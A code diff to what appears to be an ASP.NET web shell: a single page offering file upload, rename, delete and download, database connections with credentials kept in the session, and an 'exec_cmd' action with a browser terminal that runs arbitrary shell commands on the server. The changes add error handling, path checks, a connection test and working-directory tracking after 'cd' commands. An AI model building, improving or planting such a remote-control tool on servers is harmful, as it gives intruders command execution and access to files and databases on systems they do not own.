@@ -294,15 +294,26 @@ private object HandleRenameItem()
 
 private object HandleUploadFile()
 {
-    if (Request.Files.Count == 0)
-        throw new Exception("No file uploaded");
-    
-    HttpPostedFile file = Request.Files[0];
-    string path = Request.Form["path"];
-    string savePath = Path.Combine(path, file.FileName);
-    
-    file.SaveAs(savePath);
-    return new { status = "success", message = "File uploaded" };
+    try
+    {
+        if (Request.Files.Count == 0)
+            throw new Exception("No file uploaded");
+        
+        HttpPostedFile file = Request.Files[0];
+        string path = Request.Form["path"];
+        
+        if (string.IsNullOrEmpty(path) || !Directory.Exists(path))
+            throw new Exception("Invalid upload path");
+        
+        string savePath = Path.Combine(path, Path.GetFileName(file.FileName));
+        file.SaveAs(savePath);
+        
+        return new { status = "success", message = "File uploaded" };
+    }
+    catch (Exception ex)
+    {
+        return new { status = "error", message = "Upload failed: " + ex.Message };
+    }
 }
 
 private object HandleExecCmd()
@@ -316,14 +327,37 @@ private object HandleExecCmd()
 
 private object HandleDbConnect()
 {
-    Session["db_driver"] = Request.Form["driver"];
-    Session["db_host"] = Request.Form["host"];
-    Session["db_port"] = Request.Form["port"];
-    Session["db_name"] = Request.Form["dbname"];
-    Session["db_user"] = Request.Form["user"];
-    Session["db_pass"] = Request.Form["pass"];
+    string driver = Request.Form["driver"];
+    string host = Request.Form["host"];
+    string port = Request.Form["port"];
+    string dbname = Request.Form["dbname"];
+    string user = Request.Form["user"];
+    string pass = Request.Form["pass"];
     
-    return new { status = "success", message = "Connected to database" };
+    // Test connection before storing in session
+    try
+    {
+        string connStr = BuildConnectionString(driver, host, port, dbname, user, pass);
+        using (var conn = CreateDbConnection(driver, connStr))
+        {
+            conn.Open();
+            conn.Close();
+        }
+        
+        // Connection successful, store in session
+        Session["db_driver"] = driver;
+        Session["db_host"] = host;
+        Session["db_port"] = port;
+        Session["db_name"] = dbname;
+        Session["db_user"] = user;
+        Session["db_pass"] = pass;
+        
+        return new { status = "success", message = "Connected to database" };
+    }
+    catch (Exception ex)
+    {
+        return new { status = "error", message = "Connection failed: " + ex.Message };
+    }
 }
 
 private object HandleDbDisconnect()
@@ -730,7 +764,7 @@ function renderFiles(files) {
         var icon = f.name === '..' ? '⬆️' : (isDir ? '📁' : '📄');
         var cls = isDir ? 'file-name dir' : 'file-name';
         
-        var fullPath = f.name === '..' ? '' : (currentPath + '\\\\' + f.name);
+        var fullPath = f.name === '..' ? '' : (currentPath + '\\' + f.name);
         var dbl = f.name === '..' ? 'goUp()' : (isDir ? 
             'navigateTo(\\'' + esc(fullPath) + '\\')' : 
             'editFile(\\'' + esc(fullPath) + '\\')');
@@ -739,7 +773,7 @@ function renderFiles(files) {
             '<button class=""action-btn"" onclick=""event.stopPropagation();showRename(\\'' + esc(fullPath) + '\\',\\'' + esc(f.name) + '\\')"">✏️</button>' +
             (isDir ? '' : '<button class=""action-btn"" onclick=""event.stopPropagation();download(\\'' + esc(fullPath) + '\\')"">⬇️</button>') +
             '<button class=""action-btn danger"" onclick=""event.stopPropagation();showDelete(\\'' + esc(fullPath) + '\\',\\'' + esc(f.name) + '\\')"">🗑️</button>';
-        html += '<tr ondblclick=""' + dbl + '"">' +
+        html += '<tr ondblclick="' + dbl + '">' +
             '<td><span class=""file-icon"">' + icon + '</span><span class=""' + cls + '"">' + esc(f.name) + '</span></td>' +
             '<td class=""text-muted"">' + f.size + '</td>' +
             '<td><code>' + f.perms + '</code></td>' +
@@ -751,7 +785,7 @@ function renderFiles(files) {
 }
 
 function esc(s) {
-    return s.replace(/\\\\/g,'\\\\\\\\').replace(/'/g,'\\\\\\'');
+    return s.replace(/\\\\/g,'\\\\\\\\').replace(/'/g,\"\\\\'\" );
 }
 
 function navigateTo(path) { 
@@ -760,10 +794,10 @@ function navigateTo(path) {
 }
 
 function goUp() {
-    var idx = currentPath.lastIndexOf('\\\\');
+    var idx = currentPath.lastIndexOf('\\');
     if (idx > 0) {
         currentPath = currentPath.substring(0, idx);
-        if (currentPath.indexOf('\\\\') === -1) currentPath += '\\\\';
+        if (currentPath.indexOf('\\') === -1) currentPath += '\\';
     }
     loadFiles();
 }
@@ -1081,6 +1115,21 @@ function runCmd() {
             if (data.status === 'success') {
                 addToTerminal(data.data.output);
                 addToTerminal('Exit code: ' + data.data.exit_code + '\n');
+                
+                // Update working directory if cd command was used
+                if (cmd.trim().toLowerCase().startsWith('cd ')) {
+                    // Request current directory from server
+                    fetch('?api=1&action=exec_cmd', {
+                        method: 'POST',
+                        body: (() => { var fd = new FormData(); fd.append('cmd', 'cd'); fd.append('cwd', terminalCwd); return fd; })()
+                    })
+                    .then(r => r.json())
+                    .then(d => {
+                        if (d.status === 'success') {
+                            terminalCwd = d.data.output.trim();
+                        }
+                    });
+                }
             } else {
                 addToTerminal('Error: ' + data.message + '\n');
             }
